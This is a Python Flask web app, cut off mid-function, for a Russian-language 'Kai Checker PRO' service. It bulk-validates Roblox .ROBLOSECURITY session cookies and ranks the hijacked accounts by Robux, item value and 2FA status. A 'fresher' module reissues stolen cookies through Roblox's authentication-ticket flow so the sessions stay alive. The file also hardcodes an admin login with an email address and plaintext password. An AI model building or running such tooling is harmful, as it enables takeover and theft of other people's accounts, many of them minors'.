import os
import time
import logging
import re
import urllib3
import json
import sqlite3
import requests
import smtplib
import random
from email.mime.text import MIMEText
from email.header import Header
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime
from functools import wraps
from werkzeug.security import generate_password_hash, check_password_hash
from flask import Flask, render_template_string, request, jsonify, session, redirect, url_for

# ==========================================
# НАСТРОЙКИ ПОЧТЫ (ДЛЯ РЕАЛЬНОЙ РЕГИСТРАЦИИ)
# ==========================================
# Чтобы отправлялись реальные письма, создайте "Пароль приложения" в своем Google Аккаунте
SMTP_SERVER = "smtp.gmail.com"
SMTP_PORT = 465
SMTP_USER = os.getenv("SMTP_USER", "your_email@gmail.com")      # Ваша почта Gmail
SMTP_PASSWORD = os.getenv("SMTP_PASSWORD", "your_app_password")  # Пароль приложения Google

os.makedirs("downloads", exist_ok=True)
os.makedirs("uploads", exist_ok=True)
DB_PATH = "data.db"

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def init_db():
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    
    c.execute('''CREATE TABLE IF NOT EXISTS users (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    username TEXT UNIQUE,
                    email TEXT UNIQUE,
                    password TEXT,
                    created_at TEXT,
                    xp INTEGER DEFAULT 0,
                    level INTEGER DEFAULT 1,
                    balance INTEGER DEFAULT 0,
                    checks_count INTEGER DEFAULT 0,
                    is_verified INTEGER DEFAULT 1,
                    verification_code TEXT
                )''')
                
    c.execute('''CREATE TABLE IF NOT EXISTS checker_history (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    user_id INTEGER,
                    timestamp TEXT,
                    type TEXT,
                    total INTEGER,
                    valid INTEGER,
                    usernames TEXT,
                    results TEXT,
                    full_reports TEXT
                )''')
                
    c.execute('''CREATE TABLE IF NOT EXISTS fresher_history (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    user_id INTEGER,
                    timestamp TEXT,
                    mode TEXT,
                    refreshed_count INTEGER,
                    usernames TEXT,
                    cookies TEXT
                )''')
    
    # Администратор по умолчанию
    admin_user = "CowBoy"
    admin_email = "semgasigma4@gmail.com"
    admin_pass = "Qk5-sva-8uG"
    c.execute("SELECT id FROM users WHERE username=?", (admin_user,))
    if not c.fetchone():
        hashed_pass = generate_password_hash(admin_pass)
        now_str = datetime.now().strftime('%d.%m.%Y')
        c.execute("INSERT INTO users (username, email, password, created_at, xp, level, balance, checks_count, is_verified) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)",
                  (admin_user, admin_email, hashed_pass, now_str, 150, 2, 0, 5, 1))
        logger.info(f"Аккаунт {admin_user} создан!")

    conn.commit()
    conn.close()

init_db()

def send_email_verification(to_email, code):
    if not SMTP_USER or SMTP_USER == "your_email@gmail.com":
        logger.warning("SMTP не настроен, письмо не отправлено. Код: " + code)
        return False
    try:
        msg = MIMEText(f"Ваш код подтверждения для регистрации в Kai Checker: <b>{code}</b>", 'html', 'utf-8')
        msg['Subject'] = Header('Подтверждение регистрации Kai Checker', 'utf-8')
        msg['From'] = SMTP_USER
        msg['To'] = to_email

        server = smtplib.SMTP_SSL(SMTP_SERVER, SMTP_PORT)
        server.login(SMTP_USER, SMTP_PASSWORD)
        server.sendmail(SMTP_USER, [to_email], msg.as_string())
        server.quit()
        return True
    except Exception as e:
        logger.error(f"Ошибка отправки почты: {e}")
        return False

def login_required(f):
    @wraps(f)
    def decorated_function(*args, **kwargs):
        if 'logged_in' not in session or not session['logged_in']:
            if request.is_json or request.path.startswith('/api/'):
                return jsonify({'success': False, 'message': 'Unauthorized'}), 401
            return redirect(url_for('login'))
        return f(*args, **kwargs)
    return decorated_function

# ==========================================
# ЛОГИКА БД И ОПЫТА (XP)
# ==========================================
def add_checker_history(entry):
    sid = session.get('user_id')
    if not sid: return
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    total = entry.get('total', 1)
    
    c.execute('''INSERT INTO checker_history (user_id, timestamp, type, total, valid, usernames, results, full_reports)
                 VALUES (?, ?, ?, ?, ?, ?, ?, ?)''', (
        sid, datetime.now().strftime('%d.%m.%Y %H:%M:%S'),
        entry.get('type', 'single'), total, entry.get('valid', 0),
        json.dumps(entry.get('usernames', []), ensure_ascii=False),
        json.dumps(entry.get('results', []), ensure_ascii=False),
        json.dumps(entry.get('full_reports', []), ensure_ascii=False)
    ))
    
    # Начисляем реальный XP (+15 XP за каждый проверенный кук) и считаем уровень (каждые 500 XP = +1 уровень)
    c.execute("SELECT xp, level, checks_count FROM users WHERE id=?", (sid,))
    row = c.fetchone()
    if row:
        new_xp = row[0] + (total * 15)
        new_level = 1 + (new_xp // 500)
        new_checks = row[2] + total
        c.execute("UPDATE users SET xp=?, level=?, checks_count=? WHERE id=?", (new_xp, new_level, new_checks, sid))

    conn.commit()
    conn.close()

def get_checker_history():
    sid = session.get('user_id')
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute('SELECT timestamp, type, total, valid, usernames, results, full_reports FROM checker_history WHERE user_id=? ORDER BY id DESC LIMIT 50', (sid,))
    rows = c.fetchall()
    conn.close()
    return [{'timestamp': r[0], 'type': r[1], 'total': r[2], 'valid': r[3], 'usernames': json.loads(r[4]), 'results': json.loads(r[5]), 'full_reports': json.loads(r[6])} for r in rows]

def add_fresher_history(entry):
    sid = session.get('user_id')
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute('INSERT INTO fresher_history (user_id, timestamp, mode, refreshed_count, usernames, cookies) VALUES (?, ?, ?, ?, ?, ?)', (
        sid, datetime.now().strftime('%d.%m.%Y %H:%M:%S'),
        entry.get('mode', 'duplicate'), entry.get('refreshed_count', 0),
        json.dumps(entry.get('usernames', []), ensure_ascii=False),
        json.dumps(entry.get('cookies', []), ensure_ascii=False)
    ))
    conn.commit()
    conn.close()

def get_fresher_history():
    sid = session.get('user_id')
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute('SELECT timestamp, mode, refreshed_count, usernames, cookies FROM fresher_history WHERE user_id=? ORDER BY id DESC LIMIT 50', (sid,))
    rows = c.fetchall()
    conn.close()
    return [{'timestamp': r[0], 'mode': r[1], 'refreshed_count': r[2], 'usernames': json.loads(r[3]), 'cookies': json.loads(r[4])} for r in rows]

# ==========================================
# МОДУЛИ ЧЕКЕРА И ФРЕШЕРА (РОБЛОКС)
# ==========================================
def extract_cookies_from_text(text):
    cookies = []
    pattern = r'_\|WARNING:-DO-NOT-SHARE-THIS[^\s]*'
    for match in re.findall(pattern, text):
        c = match.strip('",;\'\\')
        if c.startswith('.ROBLOSECURITY='): c = c[15:]
        if len(c) > 50: cookies.append(c)
    pattern2 = r'\.ROBLOSECURITY=(_\|WARNING[^\s;]+)'
    for match in re.findall(pattern2, text):
        c = match.strip('",;\'\\')
        if len(c) > 50 and c not in cookies: cookies.append(c)
    return list(set(cookies))

def get_user_rap(session, user_id):
    try:
        r = session.get(f"https://inventory.roblox.com/v1/users/{user_id}/assets/collectibles?assetType=All&limit=100", timeout=8, verify=False)
        if r.status_code == 200:
            val = sum(item.get('recentAveragePrice', 0) for item in r.json().get('data', []))
            return val if val > 0 else None
    except: pass
    return None

def get_full_info(cookie):
    info = {'status':'❌', 'Username':'?', 'UserID':'?', 'Robux':0, 'RAP': None, 'PlaytimeHours': None, 'Created':'?', 'Country':'?', 'EmailSet':False, 'TwoFactorEnabled':False, 'AccountPinEnabled':False, 'PhoneSet':False, 'Cookie':cookie, 'IsPremium':False}
    try:
        c = cookie.strip()
        if ".ROBLOSECURITY=" in c: c = c.split(".ROBLOSECURITY=")[1].split(";")[0]
        s = requests.Session()
        s.headers.update({'Cookie': f'.ROBLOSECURITY={c}', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)', 'Accept': 'application/json'})

        r = s.get('https://users.roblox.com/v1/users/authenticated', timeout=10, verify=False)
        if r.status_code != 200: return info
        d = r.json()
        if 'id' not in d: return info
        info['UserID'] = d.get('id'); info['Username'] = d.get('name'); info['status'] = '✅'
        uid = info['UserID']

        sd = s.get('https://www.roblox.com/my/settings/json', verify=False, timeout=6).json()
        if sd:
            sec = sd.get('MyAccountSecurityModel',{})
            info['EmailSet'] = sec.get('IsEmailSet',False)
            info['TwoFactorEnabled'] = sec.get('IsIsTwoStepEnabled', sec.get('IsTwoStepEnabled', False))
            info['AccountPinEnabled'] = sec.get('IsAccountPinEnabled',False)
            info['PhoneSet'] = sec.get('IsPhoneSet',False)
        
        pm = s.get(f'https://premiumfeatures.roblox.com/v1/users/{uid}/subscriptions', verify=False, timeout=6).json()
        if pm and pm.get('isSubscribed'): info['IsPremium'] = True

        rd = s.get(f'https://users.roblox.com/v1/users/{uid}', verify=False, timeout=6).json()
        if rd:
            try: info['Created'] = datetime.fromisoformat(rd.get('created','').replace('Z','+00:00')).strftime('%d.%m.%Y')
            except: pass

        rb = s.get(f'https://economy.roblox.com/v1/users/{uid}/currency', verify=False, timeout=6).json()
        if rb: info['Robux'] = rb.get('robux',0)
        
        info['RAP'] = get_user_rap(s, uid)
        ct = s.get('https://users.roblox.com/v1/users/authenticated/country-code', verify=False, timeout=6).json()
        if ct: info['Country'] = ct.get('countryCode','?')
    except: pass
    return info

def quick_validate(cookie):
    info = get_full_info(cookie)
    score = 0
    if info['status'] == '✅':
        if info['Robux'] > 0: score += info['Robux'] // 10
        if info['RAP'] and info['RAP'] > 0: score += info['RAP'] // 50
    return {
        'status': info['status'], 'username': info['Username'], 'user_id': info['UserID'],
        'robux': info['Robux'], 'rap': info['RAP'], 'created': info['Created'],
        'is_premium': info['IsPremium'], 'has_email': info['EmailSet'], 'has_2fa': info['TwoFactorEnabled'],
        'cookie': cookie, 'score': score, 'full_info': info
    }

def mass_check(cookies_list):
    results = []
    with ThreadPoolExecutor(max_workers=10) as ex:
        futures = {ex.submit(quick_validate, c): c for c in cookies_list}
        for f in as_completed(futures):
            try: results.append(f.result())
            except: pass
    valid = [r for r in results if r['status']=='✅']
    valid.sort(key=lambda x: x['score'], reverse=True)
    invalid = [r for r in results if r['status']=='❌']
    return valid + invalid

def format_full_report(info):
    if info['status'] != '✅': return f"❌ НЕВАЛИДНЫЙ КУК\n{info['Cookie']}"
    rap_str = f"⏣ {info['RAP']:,}" if info['RAP'] is not None else "❌"
    r = f"👤 {info['Username']} | 🆔 {info['UserID']} | 📅 {info['Created']} | 🌍 {info['Country']}\n"
    r += f"💰 Robux: ⏣ {info['Robux']:,} | 💎 RAP: {rap_str} | 👑 Премиум: {'Да' if info['IsPremium'] else 'Нет'}\n"
    r += f"📧 Почта: {'✅' if info['EmailSet'] else '❌'} | 🔑 2FA: {'✅' if info['TwoFactorEnabled'] else '❌'}\n\n🍪 {info['Cookie']}"
    return r

def format_quick_report(r):
    if r['status'] == '✅':
        rap_str = f"RAP: {r['rap']:,}" if r['rap'] is not None else "RAP: ❌"
        return f"✅ {r['username']} [{r['user_id']}] | ⏣ {r['robux']:,} | {rap_str}"
    return f"❌ НЕВАЛИД"

def refresh_roblox_cookie(cookie):
    try:
        c = cookie.strip()
        if ".ROBLOSECURITY=" in c: c = c.split(".ROBLOSECURITY=")[1].split(";")[0]
        s = requests.Session()
        s.headers.update({'User-Agent': 'Mozilla/5.0'})
        if s.get('https://users.roblox.com/v1/users/authenticated', cookies={'.ROBLOSECURITY': c}, timeout=8, verify=False).status_code != 200:
            return None
        csrf = s.post('https://auth.roblox.com/v2/logout', cookies={'.ROBLOSECURITY': c}, headers={'Content-Type': 'application/json'}, verify=False).headers.get('x-csrf-token')
        if not csrf: return None
        ticket = s.post('https://auth.roblox.com/v1/authentication-ticket', headers={'RBXauthenticationNegotiation': '1', 'X-CSRF-Token': csrf}, cookies={'.ROBLOSECURITY': c}, json={}, verify=False).headers.get('rbx-authentication-ticket')
        if not ticket: return None
        res = s.post('https://auth.roblox.com/v1/authentication-ticket/redeem', headers={'RBXauthenticationNegotiation': '1'}, json={"authenticationTicket": ticket}, verify=False)
        set_cookie = res.headers.get('Set-Cookie', '')
        if '.ROBLOSECURITY=' in set_cookie:
            match = re.search(r'\.ROBLOSECURITY=([^;]+)', set_cookie)
            if match: return match.group(1)
    except: pass
    return None

# ==========================================
# UI / HTML TEMPLATES
# ==========================================
app = Flask(__name__)
app.secret_key = os.getenv("SECRET_KEY", "kai_checker_secret_key_2026")

AUTH_HTML = r"""<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <title>Авторизация | Kai Checker PRO</title>
    <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;600;700;800&display=swap" rel="stylesheet">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Plus Jakarta Sans', sans-serif; }
        body { background: #07030d; color: #f3e8ff; display: flex; align-items: center; justify-content: center; min-height: 100vh; }
        .login-card { background: rgba(23, 10, 38, 0.9); border: 1px solid rgba(168, 85, 247, 0.3); padding: 36px; border-radius: 24px; width: 100%; max-width: 420px; box-shadow: 0 10px 40px rgba(0,0,0,0.6); backdrop-filter: blur(20px); }
        h1 { font-size: 26px; font-weight: 800; text-align: center; margin-bottom: 20px; background: linear-gradient(135deg, #f472b6, #a855f7); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
        .auth-tabs { display: flex; gap: 8px; margin-bottom: 20px; background: rgba(12, 5, 20, 0.8); padding: 4px; border-radius: 12px; }
        .auth-tab { flex: 1; text-align: center; padding: 10px; font-size: 13px; font-weight: 700; color: #a78bfa; cursor: pointer; border-radius: 10px; transition: 0.2s; }
        .auth-tab.active { background: linear-gradient(135deg, #7e22ce, #a855f7); color: #fff; }
        .form-group { margin-bottom: 14px; }
        label { display: block; font-size: 11px; font-weight: 700; color: #a78bfa; margin-bottom: 6px; text-transform: uppercase; }
        input { width: 100%; padding: 12px 16px; background: rgba(12, 5, 20, 0.85); border: 1px solid rgba(168, 85, 247, 0.3); border-radius: 12px; color: #fff; font-size: 14px; outline: none; }
        input:focus { border-color: #d946ef; }
        button { width: 100%; padding: 12px; background: linear-gradient(135deg, #7e22ce, #a855f7); border: none; border-radius: 12px; color: #fff; font-weight: 700; cursor: pointer; margin-top: 8px; }
        button:hover { opacity: 0.9; }
        .error { color: #fca5a5; font-size: 12px; text-align: center; margin-top: 12px; font-weight: 600; }
        .success { color: #86efac; font-size: 12px; text-align: center; margin-top: 12px; font-weight: 600; }
    </style>
</head>
<body>
    <div class="login-card">
        <h1>Kai Checker PRO</h1>
        <div class="auth-tabs">
            <div class="auth-tab {{ 'active' if mode == 'login' else '' }}" onclick="location.href='/login'">Вход</div>
            <div class="auth-tab {{ 'active' if mode == 'register' else '' }}" onclick="location.href='/register'">Регистрация</div>
        </div>

        {% if mode == 'login' %}
        <form method="POST" action="/login">
            <div class="form-group"><label>Логин</label><input type="text" name="username" required></div>
            <div class="form-group"><label>Пароль</label><input type="password" name="password" required></div>
            <button type="submit">Войти</button>
        </form>
        {% elif mode == 'register' %}
        <form method="POST" action="/register">
            <div class="form-group"><label>Логин</label><input type="text" name="username" required></div>
            <div class="form-group"><label>Gmail (Реальная почта)</label><input type="email" name="email" required placeholder="name@gmail.com"></div>
            <div class="form-group"><label>Пароль</label><input type="password" name="password" required></div>
            <button type="submit">Зарегистрироваться</button>
        </form>
        {% elif mode == 'verify' %}
        <form method="POST" action="/verify">
            <p style="font-size:12px;color:#a78bfa;margin-bottom:12px;text-align:center;">Мы отправили код подтверждения на ваш Gmail. Введите его ниже:</p>
            <div class="form-group"><label>Код из письма</label><input type="text" name="code" required placeholder="123456"></div>
            <button type="submit">Подтвердить почту</button>
        </form>
        {% endif %}

        {% if error %}<div class="error">{{ error }}</div>{% endif %}
        {% if success %}<div class="success">{{ success }}</div>{% endif %}
    </div>
</body>
</html>"""

INDEX_HTML = r"""<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Kai Checker PRO</title>
    <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
    <style>
        :root {
            --bg: #090314;
            --bg-card: rgba(21, 10, 36, 0.75);
            --border-card: rgba(168, 85, 247, 0.2);
            --input-bg: rgba(12, 5, 22, 0.85);
            --text-main: #f3e8ff;
            --text-muted: #a78bfa;
            --accent-pink: #c026d3;
            --gradient-btn: linear-gradient(135deg, #8b5cf6 0%, #d946ef 100%);
        }
        * { margin: 0; padding: 0; box-sizing: border-box; outline: none; }
        body { font-family: 'Plus Jakarta Sans', sans-serif; min-height: 100vh; background: var(--bg); color: var(--text-main); padding: 20px; }
        .wrapper { max-width: 1350px; margin: 0 auto; }
        
        .header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 24px; }
        .logo { font-size: 28px; font-weight: 900; background: linear-gradient(135deg, #f472b6, #a855f7); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
        
        .header-actions { display: flex; align-items: center; gap: 16px; }
        .profile-widget { position: relative; }
        .profile-btn {
            background: rgba(25, 12, 42, 0.9); border: 1px solid rgba(168, 85, 247, 0.4);
            padding: 6px 16px 6px 8px; border-radius: 30px; display: flex; align-items: center; gap: 10px; cursor: pointer;
        }
        .avatar-img { width: 34px; height: 34px; border-radius: 50%; border: 1px solid var(--accent-pink); object-fit: cover; }
        .profile-name { font-weight: 700; font-size: 14px; }
        .profile-balance { color: #c026d3; font-weight: 800; font-size: 14px; }
        
        .profile-menu {
            position: absolute; right: 0; top: 52px; width: 200px;
            background: #120724; border: 1px solid rgba(168, 85, 247, 0.3);
            border-radius: 18px; padding: 10px; display: none; flex-direction: column; gap: 6px; z-index: 100;
        }
        .profile-menu.show { display: flex; }
        .menu-item { display: flex; align-items: center; gap: 10px; padding: 10px; border-radius: 12px; color: #f3e8ff; text-decoration: none; font-size: 13px; font-weight: 600; cursor: pointer; }
        .menu-item:hover { background: rgba(168, 85, 247, 0.15); }
        .menu-item.logout { color: #fca5a5; }

        .tabs { display: flex; gap: 10px; margin-bottom: 24px; background: var(--input-bg); padding: 6px; border-radius: 16px; border: 1px solid var(--border-card); width: fit-content; }
        .tab { padding: 12px 24px; border-radius: 12px; color: var(--text-muted); cursor: pointer; font-size: 14px; font-weight: 700; border: none; background: transparent; }
        .tab.active { background: var(--gradient-btn); color: #fff; }
        .tab-content { display: none; }
        .tab-content.active { display: block; }

        .card { background: var(--bg-card); border: 1px solid var(--border-card); border-radius: 20px; padding: 24px; margin-bottom: 20px; }
        .card h2 { font-size: 16px; font-weight: 800; margin-bottom: 16px; }

        .btn { padding: 12px 20px; border: none; border-radius: 12px; font-size: 13px; font-weight: 700; cursor: pointer; color: #fff; display: inline-flex; align-items: center; gap: 8px; }
        .btn-primary { background: var(--gradient-btn); }
        .btn-danger { background: rgba(239, 68, 68, 0.2); border: 1px solid rgba(239, 68, 68, 0.4); color: #fca5a5; }

        textarea { width: 100%; padding: 14px; background: var(--input-bg); border: 1px solid var(--border-card); border-radius: 14px; color: var(--text-main); font-family: monospace; font-size: 12px; }
        .result-box { background: var(--input-bg); border: 1px solid var(--border-card); border-radius: 14px; padding: 14px; max-height: 400px; overflow-y: auto; font-family: monospace; font-size: 12px; white-space: pre-wrap; margin-top: 10px; }
        .grid-2 { display: grid; grid-template-columns: 1fr 1fr; gap: 20px; }
        @media(max-width:900px){ .grid-2 { grid-template-columns: 1fr; } }

        /* НАСТОЯЩИЙ ПРОФИЛЬ БЕЗ ФЕЙКОВ */
        .profile-header-card { background: #110624; border: 1px solid var(--border-card); border-radius: 24px; padding: 24px; display: flex; justify-content: space-between; align-items: center; margin-bottom: 24px; flex-wrap: wrap; gap: 20px; }
        .user-main { display: flex; align-items: center; gap: 20px; }
        .big-avatar { width: 72px; height: 72px; border-radius: 50%; border: 2px solid var(--accent-pink); object-fit: cover; }
        .user-titles h1 { font-size: 22px; font-weight: 800; display: flex; align-items: center; gap: 10px; }
        .level-badge { background: #8b5cf6; font-size: 11px; padding: 2px 10px; border-radius: 12px; font-weight: 700; }
        .user-email { color: #a78bfa; font-size: 13px; margin-top: 4px; }
        .xp-bar-wrap { width: 240px; margin-top: 10px; }
        .xp-text { font-size: 11px; color: #a78bfa; margin-top: 4px; }
        .xp-bar { width: 100%; height: 6px; background: rgba(255,255,255,0.1); border-radius: 10px; overflow: hidden; }
        .xp-fill { height: 100%; background: var(--gradient-btn); }

        .user-stats-top { display: flex; gap: 30px; text-align: right; }
        .stat-item .val { font-size: 20px; font-weight: 800; color: #fff; }
        .stat-item .lbl { font-size: 10px; color: #a78bfa; text-transform: uppercase; margin-top: 2px; }
    </style>
</head>
<body>

<div class="wrapper">
    <div class="header">
        <div class="logo">KAI CHECKER</div>
        <div class="header-actions">
            <div class="profile-widget">
                <div class="profile-btn" onclick="document.getElementById('profileMenu').classList.toggle('show')">
                    <img src="https://api.dicebear.com/7.x/bottts/svg?seed={{ username }}" class="avatar-img">
                    <span class="profile-name">{{ username }}</span>
                    <span class="profile-balance">{{ user.balance }} ₽</span>
                </div>
                <div class="profile-menu" id="profileMenu">
                    <div class="menu-item" onclick="activateTab('profile');">👤 Аккаунт</div>
                    <div class="menu-item logout" onclick="location.href='/logout'">🚪 Выйти</div>
                </div>
            </div>
        </div>
    </div>

    <div class="tabs">
        <button class="tab active" data-tab="checker">🔍 Чекер</button>
        <button class="tab" data-tab="fresher">🔄 Фрешер</button>
        <button class="tab" data-tab="history">📋 История</button>
        <button class="tab" data-tab="profile">👤 Профиль</button>
    </div>

    <div class="tab-content active" id="tab-checker">
        <div class="grid-2">
            <div class="card">
                <h2>🔍 Одиночная проверка</h2>
                <textarea id="singleCookie" placeholder="Вставьте .ROBLOSECURITY..." rows="5"></textarea>
                <button class="btn btn-primary" onclick="runSingleCheck()" style="margin-top:12px;width:100%;">Проверить кук</button>
                <div class="result-box" id="singleResult" style="display:none;"></div>
            </div>
            <div class="card">
                <h2>📦 Массовая проверка</h2>
                <input type="file" id="massFile" accept=".txt">
                <button class="btn btn-primary" onclick="runMassCheck()" style="margin-top:12px;width:100%;">🚀 Запустить массовый чек</button>
                <div class="result-box" id="massResult" style="display:none;"></div>
            </div>
        </div>
    </div>

    <div class="tab-content" id="tab-fresher">
        <div class="card">
            <h2>🔄 Обновление сессий (Фрешер)</h2>
            <textarea id="fresherCookies" placeholder="Вставьте куки списком..." rows="6"></textarea>
            <button class="btn btn-primary" onclick="runFresher()" style="margin-top:12px;">⚡ Обновить куки</button>
            <div class="result-box" id="fresherResult" style="display:none;"></div>
        </div>
    </div>

    <div class="tab-content" id="tab-history">
        <div class="card">
            <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:12px;">
                <h2>📋 История запросов</h2>
                <button class="btn btn-danger" onclick="clearHistory('checker')">🗑️ Очистить</button>
            </div>
            <div id="checkerHistoryList">Загрузка...</div>
        </div>
    </div>

    <div class="tab-content" id="tab-profile">
        <div class="profile-header-card">
            <div class="user-main">
                <img src="https://api.dicebear.com/7.x/bottts/svg?seed={{ username }}" class="big-avatar">
                <div class="user-titles">
                    <h1>{{ username }} <span class="level-badge">Ур. {{ user.level }}</span></h1>
                    <div class="user-email">📧 {{ user.email }}</div>
                    <div class="xp-bar-wrap">
                        <div class="xp-bar"><div class="xp-fill" style="width: {{ (user.xp % 500) / 5 }}%;"></div></div>
                        <div class="xp-text">{{ user.xp % 500 }} / 500 XP до следующего уровня</div>
                    </div>
                </div>
            </div>
            <div class="user-stats-top">
                <div class="stat-item"><div class="val">{{ user.balance }} ₽</div><div class="lbl">Баланс</div></div>
                <div class="stat-item"><div class="val">{{ user.checks_count }}</div><div class="lbl">Всего проверок</div></div>
                <div class="stat-item"><div class="val">{{ user.xp }}</div><div class="lbl">Всего XP</div></div>
            </div>
        </div>
    </div>
</div>

<script>
function activateTab(tabName) {
    document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
    document.querySelectorAll('.tab-content').forEach(c => c.classList.remove('active'));
    document.querySelector(`.tab[data-tab="${tabName}"]`).classList.add('active');
    document.getElementById('tab-' + tabName).classList.add('active');
    if(tabName === 'history') loadHistory();
}
document.querySelectorAll('.tab').forEach(tab => tab.addEventListener('click', function() { activateTab(this.dataset.tab); }));

async function runSingleCheck() {
    const cookie = document.getElementById('singleCookie').value.trim();
    if(!cookie) return alert('Вставьте кук!');
    document.getElementById('singleResult').style.display = 'block';
    document.getElementById('singleResult').textContent = '⏳ Проверка...';
    const res = await fetch('/api/single-check', { method: 'POST', headers: {'Content-Type':'application/json'}, body: JSON.stringify({cookie}) });
    const data = await res.json();
    document.getElementById('singleResult').textContent = data.report || 'Ошибка';
}

async function runMassCheck() {
    const file = document.getElementById('massFile').files[0];
    if(!file) return alert('Выберите файл!');
    const fd = new FormData(); fd.append('file', file);
    document.getElementById('massResult').style.display = 'block';
    document.getElementById('massResult').textContent = '⏳ Чек...';
    const res = await fetch('/api/mass-check', { method: 'POST', body: fd });
    const data = await res.json();
    if(data.success) document.getElementById('massResult').textContent = data.results.join('\n');
}

async function runFresher() {
    const cookies = document.getElementById('fresherCookies').value.trim();
    if(!cookies) return alert('Вставьте куки!');
    document.getElementById('fresherResult').style.display = 'block';
    document.getElementById('fresherResult').textContent = '⏳ Обновление...';
    const res = await fetch('/api/fresher', { method: 'POST', headers: {'Content-Type':'application/json'}, body: JSON.stringify({cookies}) });
    const data = await res.json();
    document.getElementById('fresherResult').textContent = data.only_cookies || 'Ошибка';
}

async function loadHistory() {
    const res = await fetch('/api/history/checker');
    const data = await res.json();
    let html = '';
    data.history.forEach(i => {
        html += `<div style="background:var(--input-bg);padding:12px;border-radius:12px;margin-bottom:10px;">🕒 ${i.timestamp} — Валид: ${i.valid}/${i.total}<pre style="margin-top:6px;font-size:11px;">${i.results.join('\n')}</pre></div>`;
    });
    document.getElementById('checkerHistoryList').innerHTML = html || 'История пуста';
}

async function clearHistory(type) {
    if(!confirm('Очистить историю?')) return;
    await fetch(`/api/history/clear/${type}`, { method: 'POST' });
    loadHistory();
}
</script>
</body>
</html>"""

# ==========================================
# ROUTES
# ==========================================
@app.route("/login", methods=["GET", "POST"])
def login():
    if request.method == "POST":
        username = request.form.get("username", "").strip()
        password = request.form.get("password", "").strip()
        conn = sqlite3.connect(DB_PATH)
        c = conn.cursor()
        c.execute("SELECT id, password, is_verified FROM users WHERE username=?", (username,))
        row = c.fetchone()
        conn.close()
        
        if row and check_password_hash(row[1], password):
            if not row[2]:
                session['temp_user_id'] = row[0]
                return redirect(url_for('verify'))
            session['logged_in'] = True
            session['user_id'] = row[0]
            session['username'] = username
            return redirect(url_for('index'))
        return render_template_string(AUTH_HTML, mode='login', error="Неверный логин или пароль")
    return render_template_string(AUTH_HTML, mode='login')

@app.route("/register", methods=["GET", "POST"])
def register():
    if request.method == "POST":
        username = request.form.get("username", "").strip()
        email = request.form.get("email", "").strip()
        password = request.form.get("password", "").strip()
        
        if not username or not email or not password:
            return render_template_string(AUTH_HTML, mode='register', error="Заполните все поля")
            
        code = str(random.randint(100000, 999999))
        conn = sqlite3.connect(DB_PATH)
        c = conn.cursor()
        try:
            hashed_pass = generate_password_hash(password)
            now_str = datetime.now().strftime('%d.%m.%Y')
            c.execute("INSERT INTO users (username, email, password, created_at, is_verified, verification_code) VALUES (?, ?, ?, ?, 0, ?)",
                      (username, email, hashed_pass, now_str, code))
            uid = c.lastrowid
            conn.commit()
            conn.close()
            
            # Отправляем реальное письмо на Gmail
            send_email_verification(email, code)
            session['temp_user_id'] = uid
            return redirect(url_for('verify'))
        except sqlite3.IntegrityError:
            conn.close()
            return render_template_string(AUTH_HTML, mode='register', error="Логин или Gmail уже заняты")
    return render_template_string(AUTH_HTML, mode='register')

@app.route("/verify", methods=["GET", "POST"])
def verify():
    if 'temp_user_id' not in session: return redirect(url_for('login'))
    if request.method == "POST":
        code = request.form.get("code", "").strip()
        conn = sqlite3.connect(DB_PATH)
        c = conn.cursor()
        c.execute("SELECT id, username, verification_code FROM users WHERE id=?", (session['temp_user_id'],))
        row = c.fetchone()
        if row and row[2] == code:
            c.execute("UPDATE users SET is_verified=1, verification_code=NULL WHERE id=?", (row[0],))
            conn.commit()
            conn.close()
            session['logged_in'] = True
            session['user_id'] = row[0]
            session['username'] = row[1]
            session.pop('temp_user_id', None)
            return redirect(url_for('index'))
        conn.close()
        return render_template_string(AUTH_HTML, mode='verify', error="Неверный код подтверждения")
    return render_template_string(AUTH_HTML, mode='verify')

@app.route("/logout")
def logout():
    session.clear()
    return redirect(url_for('login'))

@app.route("/")
@login_required
def index():
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("SELECT id, username, email, xp, level, balance, checks_count FROM users WHERE id=?", (session['user_id'],))
    row = c.fetchone()
    conn.close()
    user_data = {'id': row[0], 'username': row[1], 'email': row[2], 'xp': row[3], 'level': row[4], 'balance': row[5], 'checks_count': row[6]} if row else {}
    return render_template_string(INDEX_HTML, username=session.get('username'), user=user_data)

@app.route("/api/single-check", methods=["POST"])
@login_required
def api_single_check():
    data = request.json or {}
    cookie = data.get("cookie", "").strip()
    if not cookie: return jsonify({"success": False, "message": "Кук не предоставлен"})
    info = get_full_info(cookie)
    report = format_full_report(info)
    add_checker_history({'type': 'single', 'total': 1, 'valid': 1 if info['status']=='✅' else 0, 'usernames': [info['Username']], 'results': [report], 'full_reports': []})
    return jsonify({"success": True, "report": report})

@app.route("/api/mass-check", methods=["POST"])
@login_required
def api_mass_check():
    content = ""
    if 'file' in request.files: content = request.files['file'].read().decode('utf-8', errors='ignore')
    cookies = extract_cookies_from_text(content)
